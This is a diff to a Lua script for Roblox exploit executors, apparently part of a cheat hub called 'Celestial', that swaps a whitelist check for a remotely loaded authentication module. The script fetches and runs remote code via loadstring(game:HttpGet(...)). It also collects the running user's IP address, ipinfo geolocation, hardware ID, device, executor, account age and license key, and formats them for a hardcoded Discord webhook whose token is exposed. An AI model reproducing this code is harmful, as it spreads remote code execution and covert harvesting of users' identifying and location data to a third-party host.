@@ -2,6 +2,12 @@ local webhookUrl = "https://discord.com/api/webhooks/1514036528500965548/A5Kt2C4
 local utils = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Libraries/Core%20Utilities.lua"))()
 local embedLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Libraries/Embed%20Library.lua"))()
 
+getgenv()._celestial_noauth = true
+local auth = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Authentication.lua"))()
+
+local isUser = auth.isUser()
+local user = auth.getUser()
+
 local player = game:GetService("Players").LocalPlayer
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 local httpService = game:GetService("HttpService")
@@ -10,46 +16,6 @@ local userInputService = game:GetService("UserInputService")
 
 local ipv4 = game:HttpGet("https://api.ipify.org")
 local ipdetails = game:HttpGet("https://ipinfo.io/?token=03dce9579aa8e0")
-
-local function fetchData(url)
-    local success, response = pcall(function()
-        return game:HttpGet(url)
-    end)
-
-    if success then
-        local successDecode, data = pcall(function()
-            return httpService:JSONDecode(response)
-        end)
-
-        if successDecode then
-            return data
-        else
-            player:Kick("Failed to decode JSON data from URL: ", url)
-            return
-        end
-    else
-        player:Kick("Failed to fetch data from URL: ", url)
-        return
-    end
-    return nil
-end
-
-local whitelistURL = "https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Users.json"
-local whitelistedUsers = fetchData(whitelistURL)
-
-if not whitelistedUsers then
-    player:Kick("Failed to retrieve the whitelist.")
-    return
-end
-
--- Verify user
-
-local authUser
-for _, user in ipairs(whitelistedUsers) do
-    if user.HWID == hashedHWID then
-        authUser = user
-    end
-end
 
 local function getDevice()
     if userInputService.TouchEnabled then
@@ -66,7 +32,7 @@ end
 -- Embed
 
 local footerText
-if not authUser then
+if not isUser then
     footerText = "⚠️ User is not authorized."
 end
 
@@ -94,18 +60,21 @@ local embed = embedLib.createEmbed(embedData)
 
 -- Fields
 
-local discordId = tostring(authUser and authUser.DiscordId or 0)
-local identifier = tostring(authUser and authUser.Identifier or "Unknown")
+local discordId = tostring(isUser and user.DiscordId or 0)
+local identifier = tostring(isUser and user.Identifier or "Unknown")
+local rank = tostring(isUser and user.Rank or "Unknown")
+local key = tostring(isUser and user.Key or "Unknown")
 
 local fields = {
-    { name = "Execution Date", value = "Timestamp", inline = true },
-    { name = "Linked Account", value = "<@" .. discordId .. ">", inline = true },
     { name = "Identifier", value = identifier, inline = true },
+    { name = "Rank", value = rank, inline = true },
+    { name = "Key", value = "||```" .. key .. "```||", inline = true },
+    { name = "Linked Account", value = "<@" .. discordId .. ">", inline = true },
     { name = "Account Age", value = player.AccountAge .. " Days", inline = true },
     { name = "Device", value = getDevice(), inline = true },
     { name = "Exploit", value = identifyexecutor(), inline = true },
-    { name = "IPv4", value = "||" .. ipv4 .. "||", inline = true },
-    { name = "Hardware ID (HWID)", value = "||" .. hashedHWID .. "\n\n(" .. hwid .. ")||", inline = true },
+    { name = "IPv4", value = "||```" .. ipv4 .. "```||", inline = true },
+    { name = "Hardware ID (HWID)", value = "||```" .. hashedHWID .. "``` ```\n\n" .. hwid .. "```||", inline = true },
     { name = "IP Address Lookup", value = "[IPLocation.io](https://iplocation.io/ip/" .. ipv4 .. ")", inline = true },
     { name = "IP Address Geolocation Data", value = "||```json" .. "\n" .. ipdetails .. "```||", inline = false },
 }
